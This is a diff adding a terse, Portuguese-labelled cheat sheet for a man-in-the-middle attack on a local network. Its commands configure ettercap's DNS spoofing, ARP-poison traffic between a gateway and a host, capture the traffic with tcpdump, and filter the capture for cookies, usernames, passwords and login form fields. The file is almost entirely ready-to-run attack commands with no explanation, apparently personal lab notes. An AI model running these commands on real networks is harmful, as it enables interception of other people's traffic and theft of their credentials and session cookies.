@@ -1,0 +1,36 @@
+configurar
+
+sudo nano /etc/ettercap/etter.dns
+
+
+
+
+executar
+
+sudo ettercap -T -q -M arp:remote //192.168.0.1// //192.168.0.3// -i eth0 -P dns_spoof
+
+
+
+salvar 
+
+sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r - 
+
+
+
+ler arquivo 
+
+tcpdump -r capture.pcap
+
+
+tcpdump -r capture.pcap -A | grep -i "Cookie" 
+
+
+tshark -r capture.pcap -Y 'http' -V | grep -Ei 'username|pass'
+
+
+tshark -r capture.pcap -Y 'http' -V | grep -Ei 'Form item' 
+
+===============================================================
+
+
+tshark -r tudo.pcapng -Y 'http' -V | grep -Ei 'Form item|login'
